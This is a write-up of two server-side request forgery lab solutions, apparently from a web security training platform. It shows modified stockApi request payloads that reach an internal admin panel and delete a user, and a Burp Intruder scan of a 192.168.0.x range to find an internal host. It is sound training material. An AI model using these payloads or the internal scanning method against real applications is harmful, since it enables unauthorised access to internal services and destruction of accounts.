
# Lab 1

## Description

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Solution

Clicking on `verify stock` then looking at HTTP request history shows following request:

```
POST /product/stock HTTP/2
[...]

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

changing `stockApi` to the URL from the description:

```
stockApi=http%3a//localhost/admin
```

returns the admin page. Searching for `delete` shows:

```
[...]
<a href="/admin/delete?username=carlos">Delete</a>
[...]
```

Using this in the SSRF:

```
stockApi=http%3a//localhost/admin/delete?username=carlos
```

solves the lab.


# Lab 2

## Description

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

## Solution

Same process as lab 1 for finding the SSRF endpoint:

```
POST /product/stock HTTP/2
[...]

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

To find the internal server that has an IP of `192.168.0.x`, we need to find `x`. `x` being a number between `1` and `255`, `seq` can be used as follows:

```
seq 1 255 > range.txt
```

Back to burp intruder, import `range.txt` as a wordlist and add a flag like this:

```
stockApi=http%3A%2F%2F192.168.0.$1$%3A8080%2Fadmin
```

Then run the attack a check for length differences in response. The admin panel sits at:

```
stockApi=http%3A%2F%2F192.168.0.71%3A8080%2Fadmin
```

Again, searching for `delete` in response shows:

```
[...]
http://192.168.0.71:8080/admin/delete?username=carlos
[...]
```

Using this URL  as the SSRF payload:

```
stockApi=http://192.168.0.71:8080/admin/delete?username=carlos
```

solves the challenge.


